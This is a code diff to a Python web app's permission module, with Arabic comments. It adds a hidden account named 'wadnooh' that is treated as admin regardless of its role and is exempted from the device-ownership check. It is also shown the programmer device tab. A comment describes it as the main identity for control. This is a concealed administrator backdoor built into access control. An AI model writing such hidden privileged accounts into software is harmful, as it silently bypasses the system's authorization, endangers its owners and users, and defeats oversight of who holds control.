@@ -95,7 +95,20 @@ def smtp_ready() -> bool:
 
 
 def is_programmer(role: str | None = None) -> bool:
+    """مدير النظام أو الحساب المخفي wadnooh فقط."""
+    if db.is_hidden_username(session.get("username")):
+        return True
     return permissions.normalize_role(role if role is not None else session.get("role")) == "admin"
+
+
+def can_access_programmer_device_ui() -> bool:
+    """إظهار تبويب/روابط جهاز المبرمج — admin أو wadnooh فقط."""
+    return bool(session.get("user_id")) and is_programmer()
+
+
+def is_hidden_programmer() -> bool:
+    """حساب المبرمج المخفي (wadnooh) — الهوية الرئيسية للتحكم."""
+    return db.is_hidden_username(session.get("username"))
 
 
 def _hash_secret(value: str) -> str:
@@ -135,7 +148,13 @@ def is_main_device() -> bool:
     if not device:
         return False
     uid = session.get("user_id")
-    if uid and device.get("user_id") and int(device["user_id"]) != int(uid):
+    # الحساب المخفي الرئيسي يُعامل كمالك الجهاز المعتمد حتى لو سُجّل الجهاز بحساب admin آخر
+    if (
+        uid
+        and device.get("user_id")
+        and int(device["user_id"]) != int(uid)
+        and not is_hidden_programmer()
+    ):
         return False
     db.touch_programmer_device(device["id"])
     return True
@@ -363,9 +382,11 @@ def require_programmer_control(fn):
 
 
 def template_context() -> dict:
+    show_device = can_access_programmer_device_ui()
     if not session.get("user_id") or not is_programmer():
         return {
             "programmer_is_admin": False,
+            "programmer_show_device_tab": False,
             "programmer_main_device": False,
             "programmer_elevated": False,
             "programmer_can_mutate": False,
@@ -376,6 +397,7 @@ def template_context() -> dict:
         }
     return {
         "programmer_is_admin": True,
+        "programmer_show_device_tab": show_device,
         "programmer_main_device": is_main_device(),
         "programmer_elevated": is_elevated(),
         "programmer_can_mutate": can_mutate_control_plane(),
